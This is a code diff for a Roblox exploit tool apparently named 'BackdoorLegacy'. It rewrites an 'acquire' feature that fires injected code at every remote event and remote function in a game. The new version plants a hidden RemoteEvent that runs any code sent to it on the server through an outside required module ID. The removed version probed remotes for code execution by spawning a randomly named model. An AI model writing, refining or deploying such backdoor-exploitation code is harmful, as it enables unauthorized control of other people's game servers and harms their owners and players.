@@ -143,60 +143,31 @@ Execy.MouseButton1Click:Connect(function()
 end)
 
 -- While making this acquire feature, my brain almost exploded.
+-- Acquire feature version 2.0 ! Now works more efficient and faster!
 
-Acqur.MouseButton1Click:Connect(function() 
-	local RemoteList = {} 
-	local CurrentRemote = nil 
-	local isFound = false
-	if not isAcquiring then 
-		isAcquiring = true 
-		warn('BackdoorLegacy // Scanning Started!') 
-		Cody.Text = '-- Please wait, while we are scanning the remotes.'
-		for i,v in pairs(game:GetDescendants()) do 
-			if v.Parent ~= game:GetService('RobloxReplicatedStorage') then 
-				if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
-					debug('Getting '..v.ClassName..' "'..v.Name..'" into RemoteList.')
-					table.insert(RemoteList,v) 
-				end 
-			end
+Acqur.MouseButton1Click:Connect(function()if not isAcquiring then 
+	local RequiredName = string.char(math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90))
+	local AcquireCode = 'local a = Instance.new("RemoteEvent",game:GetService("Players"):WaitForChild("'..game:GetService('Players').LocalPlayer.Name..'"); a.Name = "'..RequiredName..'"; a.OnServerEvent:Connect(function(_,code)require(14132891321):SpawnS(code,workspace)end);' 
+	Cody.Text = "-- Acquire Feature V2\n-- Acquiring, please wait..."
+	for i,v in pairs(game:GetDescendants()) do 
+		if v:IsA("RemoteEvent") then 
+			v:FireServer(AcquireCode) 
+		elseif v:IsA("RemoteFunction") then 
+			task.spawn(function()v:InvokeServer(AcquireCode)end) 
 		end 
-		for a,b in pairs(RemoteList) do
-			if AcquiredRemote == nil then 
-				print("BackdoorLegacy // Checking "..b.ClassName..' "'..b.Name..'".') 
-				local NeededNameOfModel = string.char(math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A)) 
-				local NeededCode = 'Instance.new("Model",workspace).Name="'..NeededNameOfModel ..'"'
-				CurrentRemote = b 
-				if b.Parent ~= game:GetService('RobloxReplicatedStorage') then 
-					if b:IsA('RemoteEvent') then 
-						debug('Fired')
-						b:FireServer(NeededCode) 
-					elseif b:IsA('RemoteFunction') then 
-						debug('Invoked')
-						task.spawn(function() b:InvokeServer(NeededCode) end) 
-					end 
-				end 
-				debug('Awaiting')
-				wait(2.5) 
-				if workspace:FindFirstChild(NeededNameOfModel) then 
-					debug('Detected')
-					if workspace:FindFirstChild(NeededNameOfModel):IsA("Model") then 
-						debug('Success')
-						AcquiredRemote = b
-					end 
-				end 
-			end 
-		end 	
-		if AcquiredRemote ~= nil then 
-			isFound = true 
-			Cody.Text = '-- Remote acquired! :D' 
-			warn('BackdoorLegacy // Remote acquired! :D')
-		else 
-			isFound = false 
-			Cody.Text = '-- Not found. :(' 
-			warn('BackdoorLegacy // Not found. :(')
-		end 
-		isAcquiring = false 
 	end 
-end)
+	wait(10)
+	if game:GetService("Players").LocalPlayer:FindFirstChild(RequiredName) then 
+		local SelectedInstance = game:GetService("Players").LocalPlayer:FindFirstChild(RequiredName) 
+		if SelectedInstance:IsA("RemoteEvent") then 
+			AcquiredRemote = SelectedInstance 
+			Cody.Text = "-- Acquire Feature V2\n-- Successfully acquired!" 
+		else 
+			Cody.Text = "-- Acquire Feature V2\n-- Failed to acquire a remote!" 
+		end 
+	else 
+		Cody.Text = "-- Acquire Feature V2\n-- Failed to acquire a remote!" 
+	end
+end end)
 
 -- That's the end of the code!
